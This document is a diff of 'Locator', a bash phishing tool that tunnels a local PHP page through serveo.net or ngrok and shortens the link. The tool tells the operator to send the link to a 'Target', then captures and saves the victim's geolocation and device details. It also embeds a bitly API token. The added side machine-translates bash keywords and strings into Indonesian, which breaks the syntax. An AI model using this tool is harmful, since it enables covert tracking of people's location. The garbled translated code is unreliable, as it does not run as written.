@@ -1,40 +1,40 @@
-#!/bin/bash
+#! /bin/bash
 # Locator v1.0
-# Coded by: thelinuxchoice (You dont become a coder by just changing the credits)
+# Kode oleh: thelinuxchoice (Anda tidak menjadi coder hanya dengan mengubah kredit)
 # Github: https://github.com/thelinuxchoice/locator
 
-trap 'printf "\n";stop;exit 1' 2
+perangkap  'printf "\n";berhenti;keluar 1'  2
 
 
-dependencies() {
+dependensi() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+perintah -v php > /dev/null 2>&1 || {echo >&2" Saya memerlukan php tetapi tidak diinstal.  Instal. Menggugurkan. "  ; keluar 1; }
 
 
 
-command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+perintah -v curl > /dev/null 2>&1 || {echo >&2"  "Saya membutuhkan curl tapi tidak terpasang. Instal. Menggugurkan. "  ; keluar 1; }
 
 }
 
 
 stop() {
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
+checkngrok=$(ps aux | grep -o  "ngrok"  | kepala-n1) 
+checkphp=$(ps aux | grep -o  "php"  | kepala-n1) 
+checkssh=$(ps aux | grep -o  "ssh"  | kepala-n1) 
+jika [[ $checkngrok == *'ngrok'* ]] ; maka
 	pkill -f -2 ngrok > /dev/null 2>&1
 	killall -2 ngrok > /dev/null 2>&1
 fi
-if [[ $checkphp == *'php'* ]]; then
+jika [[ $checkphp == *'php'* ]] ; maka
 	pkill -f -2 php > /dev/null 2>&1
 	killall -2 php > /dev/null 2>&1
 fi
-if [[ $checkssh == *'ssh'* ]]; then
+jika [[ $checkssh == *'ssh'* ]] ; maka
 	pkill -f -2 ssh > /dev/null 2>&1
 	killall ssh > /dev/null 2>&1
 fi
-if [[ -e sendlink ]]; then
+jika [[ -e sendlink]] ; maka
 	rm -rf sendlink
 fi
 
@@ -47,86 +47,86 @@ fi
 
 catch_cred() {
 
-longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
-IFS=$'\n'
-latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Geolocation:\n"
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $latitude $longitude
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Device Info:\n"
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
+bujur =$(grep -o  'Bujur:.*'  server / geolokasi.txt | memotong -d  "   -f2 | tr -d  ' ') 
+IFS=$'\n' 
+latitude=$(grep -o  'Latitude:.*'  server/geolocate.txt | cut  -d":"  -f2 | tr -d  ' ') 
+altitude=$(grep -o  'Altitude:.*'  server/geolocate.txt | cut  -d":"  -f2 | tr -d  ' ') 
+akurasi =$(grep -o  'Akurasi:.*'  server / geolokasi.txt | memotong -d  ":"  -f2 | tr -d  ' ') 
+hardware=$(grep-o  'Cores:.*'  server/geolocate.txt | cut  -d":"  -f2 | tr -d  ' ') 
+speed=$(grep -o  'Speed:.*'  server/geolocate.txt | cut  -d":"  -f2 | tr -d  ' ') 
+platform =$(grep -o  'Platform:.*'  server / geolocate.txt | memotong -d  ":"  -f2 | tr -d  ' ') 
+heading =$(grep  -o'Heading:.*'  server/geolocate.txt | cut   -d":"  -f2 | tr -d  ' ') 
+memory=$(grep -o  'Memory:.*'  server/geolocate.txt | cut  -d":"  -f2 | tr -d  ' ') 
+useragent =$(grep -o  'User-Agent:.*'  server /geolocate.txt | cut -d  ":"  -f2 | tr -d  ' ') 
+height=$(grep -o  'Screen Height:.*'  server/geolocate.txt | cut -d" :  "  -f2 | tr -d  ' ') 
+width=$(grep -o  'Screen Width:.*'  server/geolocate.txt | cut -d" :  "  -f2 | tr -d  ' ') 
+printf  "\n" 
+printf  "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Geolocation:\n" 
+printf  "\n" 
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m"  $latitude
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m"  $longitude
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m"  $altitude
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m"  $speed
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m"  $heading
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Akurasi:\e[0m\e[1;77m %sm\n\e[0m"  $accuracy
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m"  $latitude $longitude
+printf  "\n" 
+printf  "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Device Info:\n" 
+printf  "\n" 
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m"  $platform
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m"  $hardware
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m"  $useragent
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m"  $memory
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m"  $height $width
 cat server/geolocate.txt >> server/saved.geolocate.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n" 
+printf  "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n"  
 killall -2 php > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 killall ssh > /dev/null 2>&1
-if [[ -e sendlink ]]; then
+jika [[ -e sendlink]] ; maka
 rm -rf sendlink
 fi
-exit 1
+keluar 1
 
 }
 
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Geolocation ...\e[0m\n"
-while [ true ]; do
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Geolocation ...\e[0m\n" 
+sementara [benar];  lakukan
 
 
-if [[ -e "server/geolocate.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation Found!\n"
+jika [[ -e  "server / geolocate.txt"  ]] ; kemudian
+printf  "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Geolocation Found!\n" 
 catch_cred
 
 fi
-sleep 0.5
-if [[ -e "server/error.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Error on Geolocation!\n"
-checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
-if [[ $checkerror == 1 ]]; then
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User Denied Geolocation ...\e[0m\n"
+tidur 0,5
+jika [[ -e  "server /error.txt"  ]] ; kemudian
+printf  "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Error on Geolocation!\n" 
+checkerror =$(grep -o  'Error:.*'  server/error.txt | cut  -d" "-f2  | tr -d  ' '  ) 
+jika [[ $checkerror == 1]] ; maka
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Pengguna Ditolak Geolokasi ...\e[0m\n" 
 
 rm -rf server/error.txt
 getcredentials
-elif [[ $checkerror == 2 ]]; then
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocation Unavailable ...\e[0m\n"
+elif [[ $checkerror == 2]] ; lalu
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocation Unavailable ...\e[0m\n" 
 
 rm -rf server/error.txt
 getcredentials
-elif [[ $checkerror == 3 ]]; then
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n"
+elif [[ $checkerror == 3]] ; lalu
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n" 
 
 rm -rf server/error.txt
 getcredentials
-elif [[ $checkerror == 4 ]]; then
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknow Error ...\e[0m\n"
+elif [[ $checkerror == 4]] ; lalu
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknow Error ...\e[0m\n" 
 
 rm -rf server/error.txt
 getcredentials
-else
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error reading file error.txt...\e[0m\n"
-exit 1
+lain
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kesalahan membaca berkas.txt...\e[0m\n" 
+keluar 1
 fi
 fi
 sleep 0.5
@@ -225,47 +225,47 @@ getcredentials
 
 ##
 serverx() {
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-if [[ -e sendlink ]]; then
+printf  "\e[1;92m[\e[0m*\e[1;92m] Memulai server php...\n" 
+php -t  "server/"  -S 127.0.0.1:$port > /dev/null 2>&1 & 
+tidur 2
+printf  "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n" 
+perintah -v ssh > /dev/null 2>&1 || {echo >&2" Saya minta SSH tapi tidak terpasang.  Instal. Menggugurkan. "  ; keluar 1; }
+jika [[ -e sendlink]] ; maka
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
-printf "\n"
-sleep 4 # &
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-printf "\n"
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-printf "\n"
+ $(yang sh)  -c  'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink '  &
+printf  "\n" 
+tidur 4 # &
+send_link =$(grep  -o"https://[0-9a-z]*\.serveo.net"  sendlink) 
+printf  "\n" 
+printf  '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirim tautan langsung ke target:\e[0m\e[1;77m %s \n'  $send_link
+send_ip =$(curl-shttp://tinyurl.com/api-create.php? url=$send_link) 
+printf  '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Atau menggunakan tinyurl:\e[0m\e[1;77m %s \n'  $send_ip
+printf  "\n" 
 checkfound
 
 
 }
 
 startx() {
-if [[ -e server/ip.txt ]]; then
+jika [[ -e server/ip.txt]]; maka
 rm -rf server/ip.txt
 
 fi
-if [[ -e server/geolocate.txt ]]; then
+jika [[ -e server/geolocate.txt ]]; maka
 rm -rf server/geolocate.txt
 
 fi
 
-if [[ -e server/error.txt ]]; then
+jika [[ -e server/error.txt]]; maka
 rm -rf server/error.txt
 
 fi
 
-default_port=$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
-read port
-port="${port:-${default_port}}"
+default_port =$(seq 1111 4444 | sort -R | kepala -n1) 
+printf  '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m'  $default_port
+baca port
+port="${port:-${default_port}}" 
 serverx
 
 }
@@ -273,43 +273,43 @@ serverx
 
 ##
 
-start() {
-if [[ -e server/ip.txt ]]; then
+mulai() {
+jika [[ -e server/ip.txt]]; maka
 rm -rf server/ip.txt
 
 fi
-if [[ -e server/geolocate.txt ]]; then
+jika [[ -e server/geolocate.txt ]]; maka
 rm -rf server/geolocate.txt
 
 fi
 
-if [[ -e server/error.txt ]]; then
+jika [[ -e server/error.txt]]; maka
 rm -rf server/error.txt
 
 fi
 
-if [[ -e jq ]]; then
-echo ""
-else
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading jq...\n"
+jika [[ -e jq ]]; maka
+gema ""
+lain
+printf  "\e[1;92m[\e[0m*\e[1;92m] Mengunduh jq...\n" 
 wget https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
 mv jq-linux64 jq
 chmod +x jq
 fi
 
 
-if [[ -e ngrok ]]; then
-echo ""
-else
+jika [[ -e ngrok]] ; maka
+gema ""
+lain
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+printf  "\e[1;92m[\e[0m*\e[1;92m] Mengunduh Ngrok...\n" 
+arch=$(uname -a | grep -o  'arm'  | head -n1) 
+arch2=$(uname -a | grep -o  'Android'  | kepala -n1) 
+jika [[ $arch == *'lengan'* ]] || [[ $arch 2 == *'Android'* ]] ; maka
+perintah -v wget > /dev/null 2>&1 || {echo >&2" Saya minta wget tapi tidak terpasang.  Instal. Menggugurkan. "  ; keluar 1; }
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
+jika [[ -e ngrok-stable-linux-arm.zip ]]; maka
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
@@ -323,91 +323,104 @@ fi
 else
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
-command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
+command -v unzip > /dev/null 2>&1 || {echo >&2" Saya memerlukan  unzip tapi tidak terpasang. Instal. Menggugurkan. "  ; keluar 1; }
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
+lain
+printf  "\e[1;93m[!] Kesalahan unduh... \e[0m\n" 
+keluar 1
 fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-php -t "server/" -S 127.0.0.1:8080 > /dev/null 2>&1 & 
-sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+printf  "\e[1;92m[\e[0m*\e[1;92m] Memulai server php...\n" 
+php -t  "server/"  -S 127.0.0.1:8080 > /dev/null 2>&1 & 
+tidur 2
+printf  "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n" 
 ./ngrok http 80 > /dev/null 2>&1 &
-sleep 5
+tidur 5
 
 #link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-link=$(curl -s -N http://localhost:4040/api/tunnels > link.txt)
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | ./jq -r '.tunnels[0].public_url' > link.txt)
+link=$(curl-s -N http://127.0.0.1:4040/api/tunnels > link.txt) 
 
-send_link=$(cat link.txt | cut -d',' -f3 | cut -d '"' -f4)
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $send_link
-#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$link)
+send_link =$(catlink.txt | cut-d','  -f3 | cut -d'  " -f4  ) 
+printf  "\e[1;92m[\e[0m*\e[1;92m] Kirim tautan ini ke Target:\e[0m\e[1;77m %s\e[0m\n"  $send_link
+#send_ip =$(curl -s http://tinyurl.com/api-create.php?url=$link)
 
-bitly=$(curl -s --location --request POST 'https://api-ssl.bitly.com/v4/shorten' --header 'Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40' --header 'Content-Type: application/json' --data-raw '{"long_url": "'$send_link'"}' | ./jq  -r' '.id')
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using bitly:\e[0m\e[1;77m %s \n' $bitly
-printf "\n"
+bitly=$(curl -s --location --request POST  'https://api-ssl.bitly.com/v4/shorten'  --header'  Authorization: Bearer 4829231012ed0febfc5a1cb741df0f2e934abe40'  --header'  Content-Type: application/json'  --data-raw  '{"long_url": "'$send_link'"}'|  ./jq  -r'  .id') 
+printf  '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Atau menggunakan bitly:\e[0m\e[1;77m %s \n'  $bitly
+printf  "\n" 
 checkfound
 }
 
-start1() {
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server == 1 || $option_server == 01 ]]; then
+mulai1() {
+printf  "\n" 
+printf  "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!) \e[0m\n" 
+printf  "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n" 
+default_option_server ="1" 
+read -p  $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih opsi Port Forwarding: \e[0m\en'  option_server
+option_server ="${option_server:-${default_option_server}} " 
+jika [[ $option_server == 1 || $option_server == 01 ]]; lalu
 startx
 
-elif [[ $option_server == 2 || $option_server == 02 ]]; then
-start
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start1
+elif [[ $option_server == 2 || $option_server == 02 ]]; lalu
+mulai
+lain
+printf  "\e[1;93m [!] Opsi tidak valid!\e[0m\n" 
+tidur 1
+jelas
+mulai1
 fi
 
 }
 checkfound() {
 
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting target open the link ...\e[0m\n"
-while [ true ]; do
+printf  "\n" 
+printf  "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target tunggu buka tautan ...\e[0m\n" 
+sementara [benar];  lakukan
 
 
-if [[ -e "server/ip.txt" ]]; then
-  a=$(grep -o bitly server/ip.txt)
-  if [[ $a != bitly ]]; then
-    printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+jika [[ -e  "server / ip.txt"  ]] ; kemudian
+ a=$(grep -o bitly server/ip.txt) 
+  jika [[ $a != bitly]] ; maka
+    printf  "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n" 
     catch_ip
-  else
+  lain
     rm -f server/ip.txt
   fi
 fi
-sleep 1
-done 
+tidur 1
+selesai 
 
 }
 
-banner() {
+panji() {
 
-printf "\e[1;93m  _                                                \e[0m\n"
-printf "\e[1;93m (_)                             \e[0m\e[1;77m_                 \e[0m\n"
-printf "\e[1;77m  _        ___    ____  _____  _| |_  ___    ____  \e[0m\n"
-printf "\e[1;77m | |      / _ \  / ___)(____ |(_   _)/ _ \  / ___) \e[0m\n"
-printf "\e[1;77m | |_____| |_| |( (___ / ___ |  | |_| |_| || |     \e[0m\n"
-printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.2 \e[0m\n"
-printf "\n"
-printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @thelinuxchoice\e[0m\n"
-printf "\e[1;93m :::\e[0m\e[1;77m Modified by: @itdaglog\e[0m\n"
+printf  "\e[1;93m _ \e[0m\n" 
+printf  "\e[1;93m (_) \e[0m\e[1;77m_ \e[0m\n" 
+printf  "\e[1;77m _ ___ ____ _____ _| |_ ___ ____ \e[0m\n" 
+printf  "\e[1;77m | | / _ \ / ___)(____ | (_ _)/ _ \ / ___) \e[0m\n" 
+printf  "\e[1;77m | |______| |_| |( (___ / ___ | | |_| |_| || | \e[0m\n" 
+printf  "\e[1;77m |________)\___/ \____)\______| \__)\___/ |_| v1.2 \e[0m\n" 
+printf  "\n" 
+printf  "\e[1;93m :::\e[0m\e[1;77m Coded by: @thelinuxchoice\e[0m\n" 
+printf  "\e[1;93m :::\e[0m\e[1;77m Dimodifikasi oleh: @itdaglog\e[0m\n" 
 }
-banner
-dependencies
-start1
+panji
+dependensi
+mulai1
 
+© 2022 GitHub, Inc.
+Istilah
+Privasi
+Keamanan
+Keadaan
+Docs
+Hubungi GitHub
+Harga
+API
+Pelatihan
+Blog
+Sekitar
